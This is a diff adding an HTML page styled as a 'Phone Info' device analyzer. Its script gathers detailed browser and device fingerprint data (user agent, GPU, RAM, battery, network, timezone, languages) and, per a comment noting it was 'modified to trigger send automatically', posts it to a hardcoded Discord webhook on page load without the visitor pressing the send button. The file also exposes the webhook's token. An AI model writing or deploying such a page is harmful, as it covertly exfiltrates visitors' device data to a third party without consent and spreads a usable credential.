@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phone Info</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0a0a0f; color: #00ff88;
+      font-family: 'Courier New', monospace;
+      min-height: 100vh; display: flex;
+      align-items: center; justify-content: center;
+    }
+    .container { width: 90%; max-width: 500px; text-align: center; padding: 24px 0; }
+
+    #scanScreen { display: block; }
+    .title-text { font-size: 1.5rem; font-weight: bold; letter-spacing: 4px; margin-bottom: 4px; }
+    .subtitle   { font-size: 0.7rem; color: #00aa55; letter-spacing: 2px; margin-bottom: 24px; }
+
+    .radar {
+      width: 120px; height: 120px;
+      border: 2px solid #00ff88; border-radius: 50%;
+      margin: 0 auto 24px; position: relative;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+    .radar::before {
+      content: ''; position: absolute; top: 50%; left: 50%;
+      width: 50%; height: 2px;
+      background: linear-gradient(to right, transparent, #00ff88);
+      transform-origin: left center; animation: spin 1.5s linear infinite;
+    }
+    .radar::after {
+      content: ''; position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%,-50%); width: 8px; height: 8px;
+      background: #00ff88; border-radius: 50%;
+    }
+    @keyframes spin  { from{transform:rotate(0deg)}to{transform:rotate(360deg)} }
+    @keyframes pulse { 0%,100%{box-shadow:0 0 10px #00ff8866}50%{box-shadow:0 0 30px #00ff88cc} }
+
+    #statusTitle { font-size: 1.1rem; font-weight: bold; margin-bottom: 8px; letter-spacing: 2px; }
+    #statusLine  { font-size: 0.78rem; color: #00cc66; min-height: 1.2em; margin-bottom: 14px; }
+
+    .progress-bar-wrap {
+      background: #111; border: 1px solid #00ff8844;
+      border-radius: 4px; height: 6px; overflow: hidden; margin-bottom: 18px;
+    }
+    .progress-bar-fill {
+      height: 100%; width: 0%;
+      background: linear-gradient(to right, #00aa55, #00ff88);
+      transition: width 0.3s ease;
+    }
+    .log-box {
+      background: #0d1a12; border: 1px solid #00ff8833;
+      border-radius: 6px; padding: 12px; text-align: left;
+      font-size: 0.7rem; color: #00cc66;
+      max-height: 170px; overflow-y: auto; line-height: 1.7;
+    }
+    .log-box div { opacity: 0; animation: fadeIn 0.3s forwards; }
+    @keyframes fadeIn { to{opacity:1} }
+
+    /* DONE SCREEN */
+    #doneScreen { display: none; }
+    .done-header { margin-bottom: 16px; }
+    .done-title  { font-size: 1.4rem; letter-spacing: 4px; font-weight: bold; }
+    .done-sub    { font-size: 0.65rem; color: #00aa55; letter-spacing: 2px; margin-top: 4px; }
+    .done-icon   { font-size: 2.2rem; margin-bottom: 6px; animation: pop 0.4s ease; }
+    @keyframes pop { 0%{transform:scale(0)}80%{transform:scale(1.2)}100%{transform:scale(1)} }
+
+    .legend {
+      display: flex; gap: 12px; justify-content: center;
+      margin-bottom: 14px; font-size: 0.62rem; color: #888; flex-wrap: wrap;
+    }
+    .legend span { display: flex; align-items: center; gap: 4px; }
+    .dot { width: 7px; height: 7px; border-radius: 50%; }
+    .dot.green{background:#00ff88} .dot.orange{background:#ffaa00} .dot.red{background:#ff4444}
+
+    .section-label {
+      font-size: 0.63rem; color: #00ff8877; letter-spacing: 3px;
+      text-align: left; margin: 14px 0 5px; padding-left: 2px;
+    }
+    .info-grid { display: flex; flex-direction: column; gap: 5px; text-align: left; }
+    .info-row {
+      display: flex; justify-content: space-between;
+      background: #0d1a12; border: 1px solid #00ff8822;
+      border-radius: 6px; padding: 9px 13px;
+      font-size: 0.74rem; gap: 8px; align-items: flex-start;
+    }
+    .info-row.limited     { border-color: #ffaa0033; }
+    .info-row.limited     .info-label { color: #cc8800; }
+    .info-row.unavailable { border-color: #ff444422; opacity: 0.6; }
+    .info-row.unavailable .info-label { color: #cc4444; }
+    .info-row.unavailable .info-val   { color: #555; }
+    .info-label { color: #00aa55; flex-shrink: 0; max-width: 48%; }
+    .info-right { text-align: right; }
+    .info-val   { color: #fff; word-break: break-all; }
+    .info-note  { color: #666; font-size: 0.6rem; margin-top: 2px; }
+
+    /* SEND SECTION */
+    .send-wrap { margin-top: 22px; }
+    .send-btn {
+      width: 100%; padding: 13px;
+      background: #00ff88; color: #000;
+      border: none; border-radius: 6px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem; font-weight: bold;
+      letter-spacing: 2px; cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    .send-btn:active  { opacity: 0.7; }
+    .send-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+    #sendStatus {
+      margin-top: 10px; font-size: 0.78rem;
+      min-height: 1.2em; letter-spacing: 1px;
+    }
+    #sendStatus.ok  { color: #00ff88; }
+    #sendStatus.err { color: #ff4444; }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <div id="scanScreen">
+    <div class="title-text">PHONE INFO</div>
+    <div class="subtitle">DEVICE ANALYZER</div>
+    <div class="radar"></div>
+    <div id="statusTitle">⟩ SCANNING DEVICE</div>
+    <div id="statusLine">Initializing...</div>
+    <div class="progress-bar-wrap">
+      <div class="progress-bar-fill" id="progressFill"></div>
+    </div>
+    <div class="log-box" id="logBox"></div>
+  </div>
+
+  <div id="doneScreen">
+    <div class="done-header">
+      <div class="done-icon">✅</div>
+      <div class="done-title">PHONE INFO</div>
+      <div class="done-sub">SCAN COMPLETE</div>
+    </div>
+    <div class="legend">
+      <span><span class="dot green"></span>Full data</span>
+      <span><span class="dot orange"></span>Approximate</span>
+      <span><span class="dot red"></span>Blocked</span>
+    </div>
+    <div class="info-grid" id="infoGrid"></div>
+    <div class="send-wrap">
+      <button class="send-btn" id="sendBtn" onclick="sendToDiscord()">⟩ SEND INFO</button>
+      <div id="sendStatus"></div>
+    </div>
+  </div>
+
+</div>
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1045692977118457936/FemjztJeo1o-6G3DkJNEFbXTR6RQOeqGqMcT9XZ9OJw8xeq7wqJPkhh6HUwCBBxGITdS";
+
+  const steps = [
+    "Reading user agent...",
+    "Detecting OS version...",
+    "Identifying device model...",
+    "Detecting browser...",
+    "Reading screen specs...",
+    "Checking pixel density...",
+    "Detecting touch input...",
+    "Reading locale & language...",
+    "Checking network status...",
+    "Reading timezone...",
+    "Checking CPU cores...",
+    "Estimating RAM capacity...",
+    "Probing GPU via WebGL...",
+    "Reading browser storage...",
+    "Detecting battery...",
+    "Checking connection type...",
+    "Measuring performance baseline...",
+    "Finalizing full report...",
+  ];
+
+  const logBox       = document.getElementById('logBox');
+  const statusLine   = document.getElementById('statusLine');
+  const progressFill = document.getElementById('progressFill');
+
+  function addLog(msg) {
+    const d = document.createElement('div');
+    d.textContent = '> ' + msg;
+    logBox.appendChild(d);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  // Modified to trigger send automatically
+  async function runScan() {
+    for (let i = 0; i < steps.length; i++) {
+      statusLine.textContent = steps[i];
+      addLog(steps[i]);
+      progressFill.style.width = ((i + 1) / steps.length * 100) + '%';
+      await sleep(220 + Math.random() * 200);
+    }
+    await sleep(400);
+    
+    // Build the results UI first
+    await showResults();
+    
+    // Automatically trigger the Discord send
+    sendToDiscord();
+  }
+
+  /* ── HELPERS ── */
+  function getWebGL() {
+    try {
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!gl) return { renderer:'Not supported', vendor:'N/A', version:'N/A' };
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      return {
+        renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Supported (hidden)',
+        vendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : 'Unknown',
+        version:  gl.getParameter(gl.VERSION) || 'Unknown'
+      };
+    } catch { return { renderer:'Not supported', vendor:'N/A', version:'N/A' }; }
+  }
+
+  async function getBattery() {
+    try {
+      if (!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      const timeStr = (s) => {
+        if (!isFinite(s) || s <= 0) return null;
+        const h = Math.floor(s/3600), m = Math.floor((s%3600)/60);
+        return h ? `${h}h ${m}m` : `${m}m`;
+      };
+      return {
+        level: (b.level * 100).toFixed(0) + '%',
+        charging: b.charging,
+        timeToFull:  timeStr(b.chargingTime),
+        timeToEmpty: timeStr(b.dischargingTime)
+      };
+    } catch { return null; }
+  }
+
+  async function getStorage() {
+    try {
+      if (navigator.storage?.estimate) {
+        const e = await navigator.storage.estimate();
+        return {
+          used:  (e.usage  / 1024 / 1024).toFixed(1) + ' MB',
+          quota: (e.quota  / 1024 / 1024 / 1024).toFixed(2) + ' GB'
+        };
+      }
+    } catch {}
+    return null;
+  }
+
+  function getConnection() {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return null;
+    return {
+      type:     c.effectiveType || c.type || 'Unknown',
+      downlink: c.downlink ? c.downlink + ' Mbps' : null,
+      rtt:      c.rtt != null ? c.rtt + ' ms' : null,
+      saveData: c.saveData ? 'On' : 'Off'
+    };
+  }
+
+  function measurePerf() {
+    const t0 = performance.now();
+    let x = 0;
+    for (let i = 0; i < 500000; i++) x += Math.sqrt(i);
+    const ms = (performance.now() - t0).toFixed(1);
+    return { ms, rating: ms < 30 ? '🚀 Fast' : ms < 80 ? '✅ Normal' : '🐢 Slow' };
+  }
+
+  function getArch(ua) {
+    if (/arm64|aarch64/i.test(ua))      return 'ARM64';
+    if (/armv7|armv8/i.test(ua))        return 'ARM 32-bit';
+    if (/x86_64|Win64|WOW64/i.test(ua)) return 'x86-64 (64-bit)';
+    if (/x86/i.test(ua))                return 'x86 (32-bit)';
+    return null;
+  }
+
+  function getDeviceModel(ua) {
+    if (/iPhone/.test(ua)) return { model:'iPhone',  note:'iOS hides exact model' };
+    if (/iPad/.test(ua))   return { model:'iPad',    note:'iOS hides exact model' };
+    const m = ua.match(/\(Linux;[^)]*?;\s*([^);/]+(?:\s+[^);/]+)*)\s*(?:Build|[);])/);
+    if (m) {
+      const raw = m[1].trim();
+      if (raw && !/Android/.test(raw)) return { model: raw, note:'From user agent' };
+    }
+    if (/Windows NT 10/.test(ua)) return { model:'Windows PC',   note:'Model not exposed' };
+    if (/Macintosh/.test(ua))     return { model:'Mac',          note:'macOS hides model' };
+    if (/Linux/.test(ua))         return { model:'Linux Device', note:'' };
+    return { model:'Unknown', note:'Could not determine' };
+  }
+
+  /* ── GRID BUILDERS ── */
+  let _grid = null;
+  const _data = {};
+
+  function section(t) {
+    const s = document.createElement('div');
+    s.className = 'section-label';
+    s.textContent = '— ' + t + ' —';
+    _grid.appendChild(s);
+  }
+
+  function row(label, val, type = '', note = '') {
+    _data[label] = val + (note ? ` (${note})` : '');
+    const r = document.createElement('div');
+    r.className = 'info-row' + (type ? ' ' + type : '');
+    r.innerHTML = `
+      <span class="info-label">${label}</span>
+      <span class="info-right">
+        <div class="info-val">${val || '—'}</div>
+        ${note ? `<div class="info-note">${note}</div>` : ''}
+      </span>`;
+    _grid.appendChild(r);
+  }
+
+  /* ── SHOW RESULTS ── */
+  async function showResults() {
+    const ua      = navigator.userAgent;
+    const webgl   = getWebGL();
+    const battery = await getBattery();
+    const storage = await getStorage();
+    const conn    = getConnection();
+    const perf    = measurePerf();
+    const { model, note: modelNote } = getDeviceModel(ua);
+    const arch  = getArch(ua);
+    const ram   = navigator.deviceMemory;
+    const cores = navigator.hardwareConcurrency;
+
+    let os = 'Unknown';
+    if      (/Windows NT 10/.test(ua))    os = 'Windows 10 / 11';
+    else if (/Windows NT 6\.3/.test(ua))  os = 'Windows 8.1';
+    else if (/Windows NT 6\.1/.test(ua))  os = 'Windows 7';
+    else if (/Windows/.test(ua))          os = 'Windows';
+    else if (/Android/.test(ua))          os = 'Android ' + (ua.match(/Android ([0-9.]+)/)?.[1] || '');
+    else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS ' + (ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g,'.') || '');
+    else if (/Mac OS X/.test(ua))         os = 'macOS ' + (ua.match(/Mac OS X ([0-9_]+)/)?.[1]?.replace(/_/g,'.') || '');
+    else if (/Linux/.test(ua))            os = 'Linux';
+
+    let browser = 'Unknown';
+    if      (/Edg\//.test(ua))     browser = 'Edge '    + (ua.match(/Edg\/([\d.]+)/)?.[1] || '');
+    else if (/OPR\//.test(ua))     browser = 'Opera '   + (ua.match(/OPR\/([\d.]+)/)?.[1] || '');
+    else if (/Chrome\//.test(ua))  browser = 'Chrome '  + (ua.match(/Chrome\/([\d.]+)/)?.[1] || '');
+    else if (/Firefox\//.test(ua)) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)?.[1] || '');
+    else if (/Safari\//.test(ua))  browser = 'Safari '  + (ua.match(/Version\/([\d.]+)/)?.[1] || '');
+
+    const isMobile = /Mobi|Android|iPhone|iPad/.test(ua);
+
+    document.getElementById('scanScreen').style.display = 'none';
+    document.getElementById('doneScreen').style.display = 'block';
+    _grid = document.getElementById('infoGrid');
+
+    section('DEVICE');
+    row('Type',             isMobile ? '📱 Mobile' : '🖥️ Desktop');
+    row('Model',            model, modelNote.includes('hides') || model==='Unknown' ? 'limited' : '', modelNote);
+    row('Operating System', os);
+    row('Architecture',     arch || 'Unknown', arch ? '' : 'limited', arch ? '' : 'Not exposed by browser');
+
+    section('HARDWARE');
+    row('RAM',         ram ? ram+' GB (approx)' : 'Not available', ram ? 'limited' : 'unavailable',
+        ram ? 'Browser rounds to nearest bucket' : 'Blocked');
+    row('CPU Cores',   cores ? cores+' logical cores' : 'Not available', cores ? '' : 'unavailable',
+        'Logical/virtual cores, not physical');
+    row('GPU Renderer',webgl.renderer, webgl.renderer==='Not supported' ? 'unavailable' : '');
+    row('GPU Vendor',  webgl.vendor,   webgl.vendor==='N/A'||webgl.vendor==='Unknown' ? 'limited' : '');
+
+    section('DISPLAY');
+    row('Screen Resolution', `${screen.width} × ${screen.height} px`);
+    row('Viewport Size',     `${window.innerWidth} × ${window.innerHeight} px`);
+    row('Pixel Ratio',       window.devicePixelRatio + 'x');
+    row('Color Depth',       screen.colorDepth + '-bit');
+    row('Touch Support',     navigator.maxTouchPoints > 0 ? `Yes (max ${navigator.maxTouchPoints} pts)` : 'No');
+    row('Orientation',       screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait'));
+
+    section('PERFORMANCE');
+    row('JS Benchmark', perf.ms + ' ms', '', '500k sqrt operations');
+    row('CPU Speed',    perf.rating);
+
+    section('STORAGE');
+    if (storage) {
+      row('Browser Storage Used',  storage.used);
+      row('Browser Storage Quota', storage.quota, 'limited', 'Allocated to browser only');
+    } else {
+      row('Browser Storage', 'Not available', 'unavailable');
+    }
+    row('Cookies', navigator.cookieEnabled ? 'Enabled' : 'Disabled');
+
+    section('BATTERY');
+    if (battery) {
+      row('Battery Level', battery.level);
+      row('Charging',      battery.charging ? '⚡ Yes' : '🔋 No');
+      if (battery.charging && battery.timeToFull)   row('Time to Full',   battery.timeToFull);
+      if (!battery.charging && battery.timeToEmpty) row('Time Remaining', battery.timeToEmpty);
+    } else {
+      row('Battery', 'Not accessible', 'unavailable', 'API not supported or blocked');
+    }
+
+    section('NETWORK');
+    row('Online Status', navigator.onLine ? '🟢 Online' : '🔴 Offline');
+    if (conn) {
+      row('Connection Type', conn.type.toUpperCase());
+      if (conn.downlink) row('Est. Downlink', conn.downlink);
+      if (conn.rtt)      row('Latency (RTT)', conn.rtt);
+      row('Data Saver',  conn.saveData);
+    } else {
+      row('Connection Info', 'Not available', 'limited', 'Network API not supported');
+    }
+
+    section('LOCALE');
+    row('Language',      navigator.language || 'Unknown');
+    row('All Languages', (navigator.languages || []).join(', ') || 'Unknown');
+    row('Timezone',      Intl.DateTimeFormat().resolvedOptions().timeZone);
+    row('Do Not Track',  navigator.doNotTrack === '1' ? 'Enabled' : 'Not set');
+
+    section('BROWSER');
+    row('Browser',    browser);
+    row('Platform',   navigator.platform || 'Unknown');
+    row('User Agent', ua, '', 'Full UA string');
+  }
+
+  /* ── SEND TO DISCORD ── */
+  async function sendToDiscord() {
+    const btn    = document.getElementById('sendBtn');
+    const status = document.getElementById('sendStatus');
+    btn.disabled = true;
+    status.textContent = '⟩ SENDING...';
+    status.className = '';
+
+    const lines = Object.entries(_data).map(([k, v]) => `**${k}:** ${v}`).join('\n');
+    const payload = {
+      username: "Phone Info",
+      embeds: [{
+        title: "📱 Phone Info Report",
+        description: lines,
+        color: 0x00ff88,
+        footer: { text: new Date().toLocaleString() }
+      }]
+    };
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (res.ok) {
+        status.textContent = '✅ SENT SUCCESSFULLY';
+        status.className = 'ok';
+        btn.textContent = '⟩ SENT ✓';
+      } else {
+        throw new Error('HTTP ' + res.status);
+      }
+    } catch (e) {
+      status.textContent = '✗ FAILED: ' + e.message;
+      status.className = 'err';
+      btn.disabled = false;
+    }
+  }
+
+  runScan();
+</script>
+</body>
+  </html>
+
